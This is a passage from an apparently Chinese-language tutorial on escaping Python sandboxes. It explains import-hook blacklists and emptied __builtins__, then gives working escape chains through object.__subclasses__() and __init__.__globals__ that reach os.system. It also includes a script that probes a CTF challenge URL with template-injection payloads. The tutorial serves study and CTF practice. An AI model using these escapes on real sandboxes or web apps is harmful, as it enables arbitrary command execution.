<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>

<ol>
<li>沙箱首先获取 <code>__builtins__</code>，然后依据现有的 <code>__builtins__</code> 来构建命名空间。</li>
<li>修改 <code>__import__</code> 函数为自定义的<code>_hook_import_</code></li>
<li>删除 open 函数防止文件操作</li>
<li>exec 命令。</li>
</ol>
<p>绕过方式：</p>
<p>由于 exec 运行在特定的命名空间里，可以通过获取其他命名空间里的 <code>__builtins__</code>（这个<code>__builtins__</code>保存的就是原始<code>__builtins__</code>的引用），比如 types 库，来执行任意命令：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;string&#x27;</span>).__builtins__</span><br></pre></td></tr></table></figure></div>

<h2 id="完全限制"><a href="#完全限制" class="headerlink" title="完全限制"></a>完全限制</h2><p>在某些 <strong>Python 沙箱执行环境</strong>中，为了防止用户执行危险操作，会通过下面的方式清空 <code>__builtins__</code>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;...&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br></pre></td></tr></table></figure></div>

<p>这样做的效果是：</p>
<ul>
<li>阻止了访问 <code>print</code>, <code>eval</code>, <code>open</code>, <code>__import__</code>, <code>object</code> 等内置函数&#x2F;类；</li>
<li>即使写了 <code>&quot;__import__(&#39;os&#39;)&quot;</code>，也会报错：因为你访问不到 <code>__import__</code> 函数了。</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>在 Python 中，<code>eval(expr, globals=None, locals=None)</code>（以及 <code>exec</code>）的参数解析规则是这样的：</p>
<ul>
<li><p>如果你显式传入了 <code>globals</code> 参数，并且它是一个字典，但其中<strong>没有</strong>键 <code>__builtins__</code>，解释器会<strong>自动插入</strong>一份 <code>__builtins__</code>（通常是对内置模块 <code>builtins</code> 的引用）。</p>
</li>
<li><p>因此，仅仅将 <code>globals</code>&#x2F;<code>locals</code> 传入<strong>空字典</strong>，并不能抹掉内建函数和对象；它们会被自动补回。例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;&#125;)  <span class="comment"># ✅ 正常输出 2，因为自动补回了 builtins</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>如果你想阻止访问内建对象，需要<strong>显式覆盖</strong> <code>__builtins__</code>，比如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;len([1,2])&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)   <span class="comment"># ❌ NameError: len</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>&#125;)  <span class="comment"># ❌ NameError: __import__</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>你也可以放一个<strong>白名单 dict</strong> 作为 <code>__builtins__</code>，只允许有限的内建函数：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>&#125;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;print(&#x27;ok&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;)  <span class="comment"># ✅ 只能用 print</span></span><br></pre></td></tr></table></figure></div></li>
</ul>

    </div>
  </div>

<p>例如：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;python-input-0&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;)&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;, &#123;&#125;)</span><br><span class="line">    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure></div>

<p>然而上述示例中<strong>清空的 <code>__builtins__</code> 是“执行环境”的，而不是函数定义时保存的环境</strong>。</p>
<p>这是因为一个 Python 函数对象，在它<strong>定义的时候</strong>，解释器就会把它的定义环境（即它所在模块的 <code>globals()</code>）保存进 <code>func.__globals__</code> 里了。也就是说就算之后你手动删掉了 <code>globals()[&#39;__builtins__&#39;]</code>，这个引用也早就存着原来的内容了（指向 builtins 模块）。</p>
<p>因此这种情况下需要通过某种方式找回 <code>__builtins__</code>，然后<strong>重新获得对内置函数（如 <code>__import__</code>, <code>open</code>, <code>eval</code>, <code>os.system</code>）的访问权</strong>，以便执行命令、读取文件等。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>“清空” <code>__builtins__</code> 与删除 <code>__builtins__</code> 中的函数是有区别的。</p>
<ul>
<li><p>删除内建模块中的名字指的是在<strong>当前进程唯一的 <code>builtins</code> 模块对象</strong>上移除绑定。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">del</span> builtins.__dict__[<span class="string">&#x27;eval&#x27;</span>]   <span class="comment"># 等价于 del builtins.eval</span></span><br></pre></td></tr></table></figure></div>

<p>凡是其 <code>__builtins__</code> 指向该模块（或其 <code>__dict__</code>）的命名空间，之后对 <code>eval</code> 的内建查找均失败；<strong>已保存的函数引用</strong>（例如 <code>saved_eval = eval</code>）不受影响。是<strong>全局性修改</strong>。</p>
</li>
<li><p>在 <code>exec</code> 中提供裁剪后的内建映射仅对<strong>该次执行的命名空间</strong>更换内建查找后端；<strong>并未修改</strong>进程中的 <code>builtins</code> 模块对象。这是<strong>局部性隔离</strong>；不影响解释器全局内建模块的内容。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(code, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)             <span class="comment"># 或自定义受限字典</span></span><br></pre></td></tr></table></figure></div>

<p>该代码块内直接写 <code>eval(...)</code> 会因找不到内建而失败；但若代码能获得<strong>真实 <code>builtins</code> 模块引用</strong>（如 <code>sys.modules[&#39;builtins&#39;]</code>、<code>print.__self__</code> 等），则仍可调用其中的 <code>eval</code>——<strong>前提是它没有被上一种方式全局删除</strong>。</p>
</li>
</ul>

    </div>
  </div>

<p>Python 是高度<strong>自反</strong>（Reflective）和<strong>动态</strong>的语言。即使你删掉了 <code>__builtins__</code>，程序运行过程中创建的对象、类、模块等都依然<strong>保存在内存中并可以被访问</strong>。我们可以通过<strong>类型系统和继承结构</strong>，去“翻”到这些对象。</p>
<h3 id="获取-object-类"><a href="#获取-object-类" class="headerlink" title="获取 object 类"></a>获取 object 类</h3><p>Python 中所有对象的基类是 <code>object</code>，所以我们从任意对象出发，拿到 <code>object</code>：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="获取-object-的可用子类"><a href="#获取-object-的可用子类" class="headerlink" title="获取 object 的可用子类"></a>获取 object 的可用子类</h3><p>我们可以通过类的 <code>__subclasses__</code> 方法获取 <code>object</code> 的所有子类。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">object</span>.__subclasses__()</span><br><span class="line">[&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;async_generator&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;bytearray_iterator&#x27;</span>&gt;, ...]</span><br></pre></td></tr></table></figure></div>

<p>这就是内存中现存的类对象。我们就可以在这些子类中寻找一个有没有重载过 <code>__init__</code> 的类，以便通过 <code>__init__.__globals__</code> 找到 <code>os</code> 或 <code>builtins</code> 模块。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="built_in">len</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wrapper&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i].__init__):</span><br><span class="line">        <span class="built_in">print</span> (i, <span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[i])</span><br></pre></td></tr></table></figure></div>

<p>对于远程环境，我们可以通过循环发包请求来探测可用类在 <code>object.__subclasses__()</code> 中的下标：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用 SSL 验证警告</span></span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;https://14fba753-0bb4-47e2-bc11-9341f5e11d10.challenge.ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">probe_index</span>(<span class="params">index</span>):</span><br><span class="line">    payload = quote(<span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[<span class="subst">&#123;index&#125;</span>].__init__&#125;&#125;&#125;&#125;&quot;</span>)</span><br><span class="line">    url = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/?name=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(url, timeout=<span class="number">3</span>, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found subclass at index <span class="subst">&#123;index&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;    --&gt; <span class="subst">&#123;resp.text.strip()[:<span class="number">200</span>]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Error on index <span class="subst">&#123;index&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        probe_index(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<h3 id="globals-中的可用模块"><a href="#globals-中的可用模块" class="headerlink" title="globals 中的可用模块"></a>globals 中的可用模块</h3><p>Python <strong>函数对象</strong>有 <code>__globals__</code> 属性，保存了函数定义所在模块的<strong>全局命名空间</strong>。内置模块（<code>builtins</code>）或导入的模块（如 <code>os</code>，<code>sys</code>）常常在里面。</p>
<h4 id="builtins-模块-1"><a href="#builtins-模块-1" class="headerlink" title="builtins 模块"></a>builtins 模块</h4><p>例如 <code>warnings.catch_warnings</code> 模块的全局命名空间中有 <code>__builtins__</code> 模块，也就是说我们已经找回 <code>__builtins__</code> 模块，可以：</p>
<ul>
<li>使用该模块的 <code>__import__</code> 函数导入 <code>os</code> 模块来执行命令；</li>
<li>或者通过该模块的 <code>eval</code> 函数直接执行 python 脚本。</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这里通过 <code>__init__.__globals__</code> 找到的并不是真正的 <code>__builtins__</code> 模块，而是<strong>字典形式的 <code>builtins</code> 命名空间快照</strong>，也就是 <code>__builtins__.__dict__</code>。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>])</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(__builtins__)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;module&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>这就是为什么通过 <code>__init__.__globals__</code> 找到的“<code>__builtins__</code> 模块”可以直接通过字典的形式访问模块中的函数，而真正的 <code>__builtins__</code> 模块需要通过 <code>__dict__</code> 属性或者直接属性访问。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;module&#x27;</span> <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">eval</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">eval</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>不过两者本质上都是 <code>builtins</code> 模块，因为 Python 的模块是单例模式加载的，只有一个。</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, builtins</span><br><span class="line"></span><br><span class="line"><span class="comment"># 任意拿到两处 __builtins__：b1 可能是模块，b2 可能是字典</span></span><br><span class="line">b1 = (<span class="keyword">lambda</span>: <span class="literal">None</span>).__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line">b2 = ().__class__.__base__.__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统一拿“字典视图”</span></span><br><span class="line">d1 = b1.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(b1, <span class="string">&#x27;__dict__&#x27;</span>) <span class="keyword">else</span> b1</span><br><span class="line">d2 = b2.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(b2, <span class="string">&#x27;__dict__&#x27;</span>) <span class="keyword">else</span> b2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d1 <span class="keyword">is</span> builtins.__dict__)  <span class="comment"># True → d1 就是内建模块的命名空间</span></span><br><span class="line"><span class="built_in">print</span>(d2 <span class="keyword">is</span> builtins.__dict__)  <span class="comment"># True → d2 也是同一份命名空间</span></span><br><span class="line"><span class="built_in">print</span>(d1 <span class="keyword">is</span> d2)                 <span class="comment"># True → 同一份 dict（不是拷</span></span><br></pre></td></tr></table></figure></div>

<p>另外在沙箱内外 <code>__builtins__</code> 的形态也不同：</p>
<ul>
<li><p><strong>模块顶层（你“外面”的普通脚本）</strong><br> <code>__builtins__</code> 是一个<strong>模块对象</strong>（<code>builtins</code>）。模块对象<strong>不能下标</strong>，只能点取属性：</p>
